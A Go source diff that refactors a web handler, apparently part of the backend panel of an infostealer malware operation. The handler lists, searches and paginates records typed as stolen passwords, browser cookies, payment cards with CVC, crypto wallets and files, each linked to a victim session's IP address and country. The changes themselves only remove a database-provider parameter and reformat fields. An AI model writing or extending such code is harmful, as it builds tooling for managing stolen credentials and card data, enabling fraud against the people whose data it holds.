@@ -15,19 +15,18 @@ import (
 // Tenant-scoped: non-admins only see rows belonging to their own sessions,
 // mirroring SessionsHandler.List.
 type DataHandler struct {
-	db       *sql.DB
-	provider db.ProviderType
+	db *sql.DB
 }
 
-func NewDataHandler(d *sql.DB, provider db.ProviderType) *DataHandler {
-	return &DataHandler{db: d, provider: provider}
+func NewDataHandler(d *sql.DB) *DataHandler {
+	return &DataHandler{db: d}
 }
 
 // dataColumn describes one queryable type's table + fields.
 type dataColumn struct {
-	table   string // source table name
-	idField string // primary key column
-	fields  string // columns selected in items query
+	table   string   // source table name
+	idField string   // primary key column
+	fields  string   // columns selected in items query
 	search  []string // columns matched by the q param
 }
 
@@ -66,11 +65,11 @@ var dataColumns = map[string]dataColumn{
 
 // dataAliases maps type -> table alias used in JOIN clauses.
 var dataAliases = map[string]string{
-	"passwords":   "p",
-	"cookies":     "c",
-	"cards":       "c",
-	"wallets":     "w",
-	"files":        "f",
+	"passwords": "p",
+	"cookies":   "c",
+	"cards":     "c",
+	"wallets":   "w",
+	"files":     "f",
 }
 
 var dataSorts = map[string]string{
@@ -143,7 +142,7 @@ func (h *DataHandler) List(w http.ResponseWriter, r *http.Request) {
 	// Count
 	var total int
 	countQuery := "SELECT COUNT(*) FROM " + col.table + " " + alias + " " + join + " " + where
-	if err := db.QueryRow(h.db, h.provider, countQuery, args...).Scan(&total); err != nil {
+	if err := db.QueryRow(h.db, countQuery, args...).Scan(&total); err != nil {
 		writeError(w, http.StatusInternalServerError, "count failed")
 		return
 	}
@@ -165,7 +164,7 @@ func (h *DataHandler) List(w http.ResponseWriter, r *http.Request) {
 
 	query := "SELECT " + col.fields + ", s.country_code, s.ip, s.created_at FROM " + col.table + " " + alias +
 		" " + join + " " + where + " ORDER BY " + sortField + " " + dir + " LIMIT ? OFFSET ?"
-	rows, err := db.Query(h.db, h.provider, query, append(args, limit, offset)...)
+	rows, err := db.Query(h.db, query, append(args, limit, offset)...)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "query failed")
 		return
@@ -173,26 +172,26 @@ func (h *DataHandler) List(w http.ResponseWriter, r *http.Request) {
 	defer rows.Close()
 
 	type row struct {
-		ID         string `json:"id"`
-		SessionID  string `json:"session_id"`
-		URL        string `json:"url,omitempty"`
-		Username   string `json:"username,omitempty"`
-		Password   string `json:"password_value,omitempty"`
-		Browser    string `json:"browser,omitempty"`
-		Domain     string `json:"domain,omitempty"`
-		Name       string `json:"name,omitempty"`
-		Value      string `json:"value,omitempty"`
-		Path       string `json:"path,omitempty"`
-		Number     string `json:"number,omitempty"`
-		ExpMonth   string `json:"exp_month,omitempty"`
-		ExpYear    string `json:"exp_year,omitempty"`
-		Holder     string `json:"holder,omitempty"`
-		Cvc        string `json:"cvc,omitempty"`
-		Filename   string `json:"filename,omitempty"`
-		Size       int64  `json:"size"`
-		Country    string `json:"country_code,omitempty"`
-		IP         string `json:"ip,omitempty"`
-		CreatedAt  string `json:"created_at"`
+		ID        string `json:"id"`
+		SessionID string `json:"session_id"`
+		URL       string `json:"url,omitempty"`
+		Username  string `json:"username,omitempty"`
+		Password  string `json:"password_value,omitempty"`
+		Browser   string `json:"browser,omitempty"`
+		Domain    string `json:"domain,omitempty"`
+		Name      string `json:"name,omitempty"`
+		Value     string `json:"value,omitempty"`
+		Path      string `json:"path,omitempty"`
+		Number    string `json:"number,omitempty"`
+		ExpMonth  string `json:"exp_month,omitempty"`
+		ExpYear   string `json:"exp_year,omitempty"`
+		Holder    string `json:"holder,omitempty"`
+		Cvc       string `json:"cvc,omitempty"`
+		Filename  string `json:"filename,omitempty"`
+		Size      int64  `json:"size"`
+		Country   string `json:"country_code,omitempty"`
+		IP        string `json:"ip,omitempty"`
+		CreatedAt string `json:"created_at"`
 	}
 
 	items := make([]row, 0, limit)
